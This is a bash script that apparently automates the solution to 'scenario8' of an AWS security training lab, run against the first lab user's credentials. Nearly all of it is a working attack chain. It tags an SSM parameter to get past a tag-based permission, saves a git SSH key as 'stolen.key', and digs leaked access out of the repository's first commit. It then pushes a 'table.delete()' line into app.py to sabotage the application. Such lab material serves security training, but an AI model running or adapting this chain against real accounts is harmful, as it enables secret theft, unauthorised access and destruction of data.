#!/bin/bash
# Read data from DynamoDB
data_base=($(aws dynamodb scan --table-name users --profile $1))
user_email=($(echo ${data_base[@]} | jq .Items[].email.S | tr -d '"'))
userid=($(echo ${data_base[@]} | jq .Items[].userid.S | tr -d '"' | cut -d @ -f 1))
secret_key=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario8.M.secret_key.S | tr -d '"'))
access_key=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario8.M.access_key.S | tr -d '"'))
username=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario8.M.username.S | tr -d '"'))
git_ip=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario8.M.git_repository_ip.S | tr -d '"'))

# Creating backup files with aws credentials
if [ ! -f ~/.aws/config_bacup ]
  then
    cp ~/.aws/config ~/.aws/config_bacup
    cp ~/.aws/credentials ~/.aws/credentials_bacup
fi
echo "///////////////////////////////////"
echo "//         Scenario8             //"
echo "///////////////////////////////////"
# The passage of the 8th scenario by each user
# for ((i = 0; i < ${#user_email[@]}; i++))
# The passage of the 8th scenario by first user
for ((i = 0; i < 1; i++))
    do
        echo "------------------------------------------------------------------------"
        echo ${username[i]}": "${user_email[i]}": "${access_key[i]}": "${secret_key[i]}
        echo "***"
        echo "Configure profile scenario8_${userid[i]}"
        echo "access_key: ${access_key[i]}"
        echo "secret_key: ${secret_key[i]}"
        aws configure set aws_access_key_id ${access_key[i]} --profile scenario8_${userid[i]}
        aws configure set aws_secret_access_key ${secret_key[i]} --profile scenario8_${userid[i]}
        aws configure set region eu-central-1 --profile scenario8_${userid[i]}
        aws configure set output json --profile scenario8_${userid[i]}
        echo "***"
        echo "list-user-policies"
        aws iam list-user-policies --no-cli-pager --user-name ${username[i]} --profile scenario8_${userid[i]}
        echo "get-user-policy"
        aws iam get-user-policy --no-cli-pager --user-name scenario8_${userid[i]} --policy-name scenario8-user-policy-${userid[i]} --profile scenario8_${userid[i]}
        echo "ssm add-tags-to-resource"
        aws ssm add-tags-to-resource --no-cli-pager --resource-type "Parameter" --resource-id git_access_key_for_sc8_ro_user_${userid[i]} --tags "Key=Environment,Value=sandbox" --profile scenario8_${userid[i]}
        echo "ssm get-parameter"
        aws ssm get-parameter --no-cli-pager --name git_access_key_for_sc8_ro_user_${userid[i]} --query Parameter.Value --profile scenario8_${userid[i]} --output text > stolen.key
        chmod 700 stolen.key
        ssh_bin=$(which ssh)
        key_path=$(realpath stolen.key)
        echo "git clone the repository"
        git clone -c core.sshCommand="$ssh_bin -i $key_path -o IdentitiesOnly=yes" git@${git_ip}:root/scenario8_${userid[i]}.git
        echo "cd to repo"
        cd scenario8_${userid[i]}
        echo "take 1st commit"
        first_id=$(git rev-list --max-parents=0 HEAD)
        echo $first_id
        echo "git show 1st commit and get new access & secret keys"
        show_first=$(git show $first_id)
        echo $show_first > first
        git_repo=$(grep -Po -e "git clone \K.*?(?= )" first)
        echo "git_repo : "$git_repo
        echo "git clone again (developer access)" 
        git clone $git_repo
        cd scenario8_${userid[i]}
        echo "add table.delete() into app.py"
        sed -i '9i table.delete()' app.py
        git commit -am "teble.delete() added"
        git push
        cd ../..
        rm -rf scenario8_${userid[i]}
        rm stolen.key
        echo "Done"
        echo "------------------------------------------------------------------------"
    done